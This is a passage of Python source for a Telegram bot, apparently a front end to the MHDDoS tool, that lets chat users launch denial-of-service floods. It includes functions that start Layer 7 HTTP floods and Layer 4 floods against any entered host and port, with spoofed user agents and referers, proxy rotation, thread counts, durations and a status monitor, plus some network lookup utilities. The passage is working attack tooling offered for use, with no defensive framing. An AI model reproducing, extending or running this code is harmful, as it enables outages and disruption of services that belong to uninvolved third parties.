            except Exception as e:
                result = f"⚠️ Ping failed: {str(e)}"
            
            await self.safe_reply(
                update.message,
                result,
                reply_markup=self.get_tools_keyboard()
            )
        
        elif tool == "check":
            await self.safe_reply(update.message, "✔️ Checking...")
            try:
                url = target if target.startswith("http") else f"http://{target}"
                r = requests_get(url, timeout=20)
                try:
                    status_emoji = "🟢" if r.status_code <= 500 else "🔴"
                    result = f"""
✔️ Website Check for {url}:
-------------------------
📊 Status Code: {r.status_code}
{status_emoji} Status: {"ONLINE" if r.status_code <= 500 else "OFFLINE"}
"""
                finally:
                    r.close()
            except Exception as e:
                result = f"⚠️ Check failed: {str(e)}"
            
            await self.safe_reply(
                update.message,
                result,
                reply_markup=self.get_tools_keyboard()
            )
        
        elif tool == "tssrv":
            await self.safe_reply(update.message, "🎮 Looking up SRV records...")
            try:
                info = ToolsConsole.ts_srv(domain)
                result = f"""
🎮 TeamSpeak SRV for {domain}:
----------------------------
🔵 TCP: {info.get('_tsdns._tcp.', 'Not found')}
🟣 UDP: {info.get('_ts3._udp.', 'Not found')}
"""
            except Exception as e:
                result = f"⚠️ TSSRV lookup failed: {str(e)}"
            
            await self.safe_reply(
                update.message,
                result,
                reply_markup=self.get_tools_keyboard()
            )
        
        else:
            await self.safe_reply(
                update.message,
                "⚠️ Unknown tool. Please select from the menu.",
                reply_markup=self.get_tools_keyboard()
            )
        
        return ConversationState.TOOLS_MENU.value
    
    async def run_dstat(self, query) -> None:
        """Run DSTAT tool."""
        try:
            nd = net_io_counters(pernic=False)
            result = f"""
📊 Network Statistics:
---------------------
📤 Bytes Sent: {Tools.humanbytes(nd.bytes_sent)}
📥 Bytes Received: {Tools.humanbytes(nd.bytes_recv)}
📦 Packets Sent: {Tools.humanformat(nd.packets_sent)}
📬 Packets Received: {Tools.humanformat(nd.packets_recv)}
⚠️ Errors In: {nd.errin}
⚠️ Errors Out: {nd.errout}
🔻 Drop In: {nd.dropin}
🔻 Drop Out: {nd.dropout}
💻 CPU Usage: {cpu_percent()}%
🧠 Memory: {virtual_memory().percent}%
🧵 Active Threads: {active_count()}
📈 Max Threads: {SYSTEM_MAX_THREADS}
"""
            await self.safe_edit_message(
                query,
                result,
                reply_markup=self.get_tools_keyboard()
            )
        except Exception as e:
            logger.error(f"Error in run_dstat: {e}")
            await self.safe_edit_message(
                query,
                f"⚠️ DSTAT error: {str(e)}",
                reply_markup=self.get_tools_keyboard()
            )
    
    async def start_attack(self, query, user_id: int, config: AttackConfig) -> None:
        """Start the attack with given configuration."""
        # Validate configuration
        is_valid, error_msg = config.validate()
        if not is_valid:
            await self.safe_edit_message(
                query,
                f"⚠️ Cannot start attack: {error_msg}",
                reply_markup=self.get_main_menu_keyboard()
            )
            return
        
        # Stop any existing attack and cancel its monitor task
        if user_id in self.active_sessions:
            old_session = self.active_sessions[user_id]
            old_session.event.clear()
            old_session.is_running = False
            if old_session.monitor_task and not old_session.monitor_task.done():
                old_session.monitor_task.cancel()
        
        event = Event()
        
        session = AttackSession(
            config=config.copy(),
            event=event,
            start_time=time()
        )
        
        self.active_sessions[user_id] = session
        
        # Reset counters
        REQUESTS_SENT.set(0)
        BYTES_SEND.set(0)
        
        try:
            await self.safe_edit_message(query, "🚀 Starting attack... Please wait.")
            
            if config.is_layer7:
                await self._start_layer7_attack(query, session)
            else:
                await self._start_layer4_attack(query, session)
            
            # Start monitoring task and store reference for cleanup
            session.monitor_task = asyncio.create_task(self._monitor_attack(query, user_id, session))
            
        except Exception as e:
            logger.error(f"Attack failed to start: {e}\n{traceback.format_exc()}")
            session.event.clear()
            session.is_running = False
            if user_id in self.active_sessions:
                del self.active_sessions[user_id]
            await self.safe_edit_message(
                query,
                f"⚠️ Attack failed to start:\n{str(e)}\n\n🏠 Main Menu:",
                reply_markup=self.get_main_menu_keyboard()
            )
    
    async def _start_layer7_attack(self, query, session: AttackSession) -> None:
        """Start Layer 7 attack."""
        config = session.config
        
        # Prepare URL
        urlraw = config.target if config.target.startswith("http") else f"http://{config.target}"
        url = URL(urlraw)
        host = url.host
        
        if config.method != "TOR":
            try:
                host = gethostbyname(url.host)
            except Exception as e:
                raise BotError(f"Cannot resolve hostname: {str(e)}")
        
        # Load user agents and referers
        useragent_li = __dir__ / "files/useragent.txt"
        referers_li = __dir__ / "files/referers.txt"
        
        uagents = set()
        referers = set()
        
        try:
            if useragent_li.exists():
                uagents = set(a.strip() for a in useragent_li.open("r").readlines() if a.strip())
            if referers_li.exists():
                referers = set(a.strip() for a in referers_li.open("r").readlines() if a.strip())
        except Exception as e:
            logger.warning(f"Failed to load useragents/referers: {e}")
        
        # Handle proxies using PyRoxy (same as CLI)
        proxies = None
        proxy_msg = ""
        if config.proxy_type >= 0:
            proxies, proxy_msg = await handle_proxy_list(config.proxy_type, min(config.threads, 100), url)
        
        # Start threads with error tracking
        started_threads = 0
        for thread_id in range(config.threads):
            try:
                t = HttpFlood(
                    thread_id, url, host, config.method, config.rpc,
                    session.event, uagents, referers, proxies
                )
                t.start()
                session.threads.append(t)
                started_threads += 1
            except Exception as e:
                session.error_count += 1
                session.last_error = str(e)
                logger.warning(f"Failed to start thread {thread_id}: {e}")
                if started_threads == 0:
                    raise BotError(f"Failed to start any threads: {e}")
        
        session.event.set()
        session.is_running = True
        
        proxy_info = f"\n🔒 Proxies: {len(proxies):,}" if proxies else "\n🔒 Proxies: None"
        thread_info = f"\n⚠️ Started {started_threads}/{config.threads} threads" if started_threads < config.threads else ""
        
        msg = (
            f"🚀 Attack Started!\n\n"
            f"🎯 Target: {config.target}\n"
            f"⚡ Method: {config.method}\n"
            f"🧵 Threads: {started_threads}\n"
            f"⏱️ Duration: {config.duration}s{proxy_info}{thread_info}\n\n"
            f"Use 🔄 Refresh Status to see progress."
        )
        await self.safe_edit_message(query, msg, reply_markup=self.get_stop_keyboard())
    
    async def _start_layer4_attack(self, query, session: AttackSession) -> None:
        """Start Layer 4 attack."""
        config = session.config
        
        target = config.target
        try:
            target = gethostbyname(target)
        except Exception as e:
            raise BotError(f"Cannot resolve hostname: {str(e)}")
        
        # Handle proxies for supported methods using PyRoxy (same as CLI)
        proxies = None
        proxy_msg = ""
        if config.method in {"MINECRAFT", "MCBOT", "TCP", "CPS", "CONNECTION"} and config.proxy_type >= 0:
            proxies, proxy_msg = await handle_proxy_list(config.proxy_type, min(config.threads, 100))
        
        # Start threads with error tracking
        started_threads = 0
        for _ in range(config.threads):
            try:
                t = Layer4(
                    (target, config.port), None, config.method,
                    session.event, proxies, con.get("MINECRAFT_DEFAULT_PROTOCOL", 47)
                )
                t.start()
                session.threads.append(t)
                started_threads += 1
            except Exception as e:
                session.error_count += 1
                session.last_error = str(e)
                logger.warning(f"Failed to start Layer4 thread: {e}")
                if started_threads == 0:
                    raise BotError(f"Failed to start any threads: {e}")
        
        session.event.set()
        session.is_running = True
        
        proxy_info = f"\n🔒 Proxies: {len(proxies):,}" if proxies else ""
        thread_info = f"\n⚠️ Started {started_threads}/{config.threads} threads" if started_threads < config.threads else ""
        
        msg = (
            f"🚀 Attack Started!\n\n"
            f"🎯 Target: {target}:{config.port}\n"
            f"⚡ Method: {config.method}\n"
            f"🧵 Threads: {started_threads}\n"
            f"⏱️ Duration: {config.duration}s{proxy_info}{thread_info}\n\n"
            f"Use 🔄 Refresh Status to see progress."
        )
        await self.safe_edit_message(query, msg, reply_markup=self.get_stop_keyboard())
    
    async def _monitor_attack(self, query, user_id: int, session: AttackSession) -> None:
        """Monitor attack progress and stop when duration expires."""
        start_time = session.start_time
        duration = session.config.duration
        
        try:
            while session.is_running and time() < start_time + duration:
                await asyncio.sleep(5)
                
                if not session.is_running:
                    break
            
            # Stop attack when duration expires
            if session.is_running:
                session.event.clear()
                session.is_running = False
                
                if user_id in self.active_sessions:
                    del self.active_sessions[user_id]
                
                # Calculate final stats
                elapsed = int(time() - start_time)
                
                # Try to notify user
                try:
                    msg = (
                        f"✅ Attack Completed!\n\n"
                        f"🎯 Target: {session.config.target}\n"
                        f"⚡ Method: {session.config.method}\n"
                        f"⏱️ Duration: {elapsed}s\n"
                        f"🧵 Threads Used: {len(session.threads)}\n"
                        f"⚠️ Errors: {session.error_count}\n\n"
                        f"🏠 Main Menu:"
                    )
                    await query.message.reply_text(msg, reply_markup=self.get_main_menu_keyboard())
                except TelegramError as e:
                    logger.warning(f"Failed to send completion message: {e}")
                    
        except asyncio.CancelledError:
            logger.info(f"Monitor task cancelled for user {user_id}")
        except Exception as e:
            logger.error(f"Error in monitor task: {e}\n{traceback.format_exc()}")
            session.error_count += 1
            session.last_error = str(e)
    
    def run(self) -> None:
        """Run the bot."""
        # Fix for Python 3.10+ where asyncio.get_event_loop() doesn't auto-create event loops
        # This ensures an event loop exists before run_polling() is called
        try:
            loop = asyncio.get_event_loop()
            if loop.is_closed():
                raise RuntimeError("Event loop is closed")
        except RuntimeError:
            # No event loop exists or it's closed, create a new one
            asyncio.set_event_loop(asyncio.new_event_loop())
        
        # Start health check server for Heroku (required for web dyno)
        try:
            port = int(os.environ.get('PORT', 8080))
        except (ValueError, TypeError) as e:
            logger.warning(f"Invalid PORT environment variable, using default 8080: {e}")
            port = 8080
        
        health_thread = Thread(target=start_health_check_server, args=(port,), daemon=True)
        health_thread.start()
        logger.info(f"Started health check server thread on port {port}")
        
        application = Application.builder().token(self.token).build()
        
        # Add global error handler
        async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
            """Handle errors in the bot."""
            logger.error(f"Exception while handling an update: {context.error}")
            logger.error(traceback.format_exc())
            
            # Try to notify user of the error
            if update and update.effective_user:
                try:
                    if update.callback_query:
                        await update.callback_query.message.reply_text(
                            f"⚠️ An error occurred: {str(context.error)[:100]}",
                            reply_markup=self.get_main_menu_keyboard()
                        )
                    elif update.message:
                        await update.message.reply_text(
                            f"⚠️ An error occurred: {str(context.error)[:100]}",
                            reply_markup=self.get_main_menu_keyboard()
                        )
                except TelegramError:
                    pass
        
        application.add_error_handler(error_handler)
        
        # Create conversation handler
        conv_handler = ConversationHandler(
            entry_points=[CommandHandler("start", self.start_command)],
            states={
                ConversationState.MAIN_MENU.value: [
                    CallbackQueryHandler(self.button_callback),
                ],
                ConversationState.SELECT_LAYER.value: [
                    CallbackQueryHandler(self.button_callback),
                ],
                ConversationState.SELECT_METHOD.value: [
                    CallbackQueryHandler(self.button_callback),
                ],
                ConversationState.ENTER_TARGET.value: [
                    MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_text_input),
                    CallbackQueryHandler(self.button_callback),
                ],
                ConversationState.ENTER_PORT.value: [
                    MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_text_input),
                    CallbackQueryHandler(self.button_callback),
                ],
                ConversationState.ENTER_THREADS.value: [
                    MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_text_input),
                    CallbackQueryHandler(self.button_callback),
                ],
                ConversationState.ENTER_DURATION.value: [
                    MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_text_input),
                    CallbackQueryHandler(self.button_callback),
                ],
                ConversationState.ENTER_RPC.value: [
                    MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_text_input),
                    CallbackQueryHandler(self.button_callback),
                ],
                ConversationState.SELECT_PROXY_TYPE.value: [
                    CallbackQueryHandler(self.button_callback),
                ],
                ConversationState.CONFIRM_ATTACK.value: [
                    CallbackQueryHandler(self.button_callback),
                ],
                ConversationState.TOOLS_MENU.value: [
                    CallbackQueryHandler(self.button_callback),
                ],
                ConversationState.TOOLS_INPUT.value: [
                    MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_tools_input),
                    CallbackQueryHandler(self.button_callback),
                ],
                ConversationState.PROXY_MANAGEMENT.value: [
                    CallbackQueryHandler(self.button_callback),
                ],
                ConversationState.API_MANAGEMENT.value: [
                    CallbackQueryHandler(self.button_callback),
                ],
                ConversationState.API_ADD.value: [
                    MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_text_input),
                    CallbackQueryHandler(self.button_callback),
                ],
                ConversationState.SELECT_ATTACK_MODE.value: [
                    CallbackQueryHandler(self.button_callback),
                ],
            },
            fallbacks=[
                CommandHandler("start", self.start_command),
                CommandHandler("help", self.help_command),
                CommandHandler("status", self.status_command),
                CommandHandler("stop", self.stop_command),
            ],
            allow_reentry=True,
        )
        
        application.add_handler(conv_handler)
        application.add_handler(CommandHandler("help", self.help_command))
        application.add_handler(CommandHandler("status", self.status_command))
        application.add_handler(CommandHandler("stop", self.stop_command))
        
        logger.info(f"Starting MHDDoS Telegram Bot... (Max threads: {SYSTEM_MAX_THREADS})")
        application.run_polling(allowed_updates=Update.ALL_TYPES)


def main():
    """Main entry point."""
    # Get bot token from environment or config
    token = os.environ.get("TELEGRAM_BOT_TOKEN")
    
    if not token:
        # Try to load from config.json
        config_path = __dir__ / "config.json"
        if config_path.exists():
            try:
                with open(config_path) as f:
                    config = load(f)
                    token = config.get("telegram_bot_token")
            except JSONDecodeError as e:
                print(f"Error: config.json contains invalid JSON: {str(e)}")
                return
            except Exception as e:
                print(f"Error: Failed to read config.json: {str(e)}")
                return
    
    if not token:
        print("Error: TELEGRAM_BOT_TOKEN environment variable or telegram_bot_token in config.json is required.")
        print("Set it with: export TELEGRAM_BOT_TOKEN='your-bot-token'")
        print("Or add 'telegram_bot_token': 'your-bot-token' to config.json")
        return
    
    # Get allowed users (optional)
    allowed_users = []
    allowed_users_env = os.environ.get("TELEGRAM_ALLOWED_USERS")
    if allowed_users_env:
        for uid in allowed_users_env.split(","):
            uid = uid.strip()
            if uid:
                try:
                    allowed_users.append(int(uid))
                except ValueError:
                    print(f"Warning: Invalid user ID '{uid}' in TELEGRAM_ALLOWED_USERS - must be a numeric Telegram user ID, skipping")
    
    # Create and run bot
    bot = MHDDoSBot(token, allowed_users)
    bot.run()


if __name__ == "__main__":
    main()
